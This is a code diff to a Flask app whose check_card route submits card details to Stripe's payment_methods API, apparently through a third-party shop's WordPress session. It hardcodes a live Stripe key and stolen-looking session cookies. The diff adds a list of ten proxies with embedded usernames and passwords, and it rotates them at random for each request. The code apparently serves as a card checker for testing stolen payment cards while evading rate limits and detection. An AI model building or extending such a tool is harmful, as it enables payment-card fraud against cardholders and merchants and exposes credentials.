@@ -13,6 +13,23 @@ app = Flask(__name__)
 DOMAIN = "https://infiniteautowerks.com"
 STRIPE_PK = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
 
+# Proxy List
+PROXIES = [
+    "http://devtronex:devtronexop@31.59.20.176:6754",
+    "http://devtronex:devtronexop@23.95.150.145:6114",
+    "http://devtronex:devtronexop@198.23.239.134:6540",
+    "http://devtronex:devtronexop@45.38.107.97:6014",
+    "http://devtronex:devtronexop@107.172.163.27:6543",
+    "http://devtronex:devtronexop@198.105.121.200:6462",
+    "http://devtronex:devtronexop@64.137.96.74:6641",
+    "http://devtronex:devtronexop@216.10.27.159:6837",
+    "http://devtronex:devtronexop@23.26.71.145:5628",
+    "http://devtronex:devtronexop@23.229.19.94:8689"
+]
+
+def get_proxy():
+    return random.choice(PROXIES)
+
 # 🍪 UPDATE COOKIES HERE MANUALLY
 COOKIES = {
     'wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb': 'syvyri%7C1771083748%7C3DURrnxtUajsodz96WXAkzxzkRW2fgcvL49ZK6Pp6p3%7Cd94d75c1fdfdf288e62cb6b66a10c2390af838774428cf1a850af4d249e3ff91',
@@ -65,6 +82,9 @@ def check_card():
         })
 
     session = requests.Session()
+    # Set Proxy
+    proxy = get_proxy()
+    session.proxies = {"http": proxy, "https": proxy}
     session.cookies.update(COOKIES)
 
     # ==========================================
@@ -137,7 +157,7 @@ def check_card():
         "time_on_page": "89234",
     }
 
-    req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data2, timeout=10)
+    req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data2, proxies={"http": proxy, "https": proxy}, timeout=10)
     
     if req2.status_code != 200:
         try:
